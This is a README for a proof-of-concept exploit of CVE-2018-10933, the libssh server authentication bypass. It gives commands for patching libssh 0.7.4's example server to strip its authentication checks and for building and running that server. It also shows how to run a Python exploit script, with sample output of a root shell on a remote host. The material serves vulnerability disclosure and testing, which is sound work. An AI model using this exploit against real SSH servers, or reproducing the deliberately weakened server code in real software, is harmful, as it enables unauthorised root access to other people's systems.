# CVE-2018-10933 - Server-side Auth. Bypass
This is a simple Proof of Concept (PoC) to demonstrate successful
exploitation of the authentication-bypass vulnerability as found in
the server-side code of libssh 0.6 and later. See [security advisory for CVE-2018-10933](https://www.libssh.org/security/advisories/CVE-2018-10933.txt)
for more information.

## Vulnerable Server POC
In order to get a full interactive shell, the server code must somehow allow
several SSH requests such as `shell channel request`. Most production-use
implementations disallow them by checking the internal session's authentication
state. If the programmer insufficiently checked the auth. state, the
exploitation may be successful.

The [CVE-2018-10933-server.patch](CVE-2018-10933-server.patch) patch removes
checks for the authentication states in the `ssh_server_fork.c` example shipped
with libssh-0.7.4. See below for the patching instructions.

### Building the vulnerable server
```
$ wget https://www.libssh.org/files/0.7/libssh-0.7.4.tar.xz
$ tar -xvf libssh-0.7.4.tar.xz
$ cd libssh-0.7.4/
$ cd examples/
$ patch -p0 < CVE-2018-10933-server.patch
$ cd ..
$ mkdir -p build
$ cmake ..
$ make
```

### Running the vulnerable server
Here you're running the vulnerable SSH server on localhost, port tcp/2222:
```
$ cd examples/
$ sudo ./ssh_server_fork -p 2222 127.0.0.1
```

## Exploit
This repository includes a simple [exploit](CVE-2018-10933-SHELL-POC.py) code
written in Python that allow to pass commands directly to the shell's of a
vulnerable libssh server (see above for a vulnerable server implementation).
```
$ git clone https://github.com/e3prom/miscsec.git
$ cd CVE-2018-10933
$ python CVE-2018-10933-SHELL-POC.py --verbose -p 2222 10.240.0.169
[*] Type quit to exit this command prompt.

$ id
#
id
uid=0(root) gid=0(root) groups=0(root),999(docker)
#
$ quit
```

## Credits
* The vulnerability has been discovery by Peter Winter-Smith of NCC Group.
* [CVE-2018-10933: libssh: authentication bypass in server code](https://seclists.org/oss-sec/2018/q4/55)
* [SoledaD208's CVE-2018-10933 very simple POC](https://github.com/SoledaD208/CVE-2018-10933)
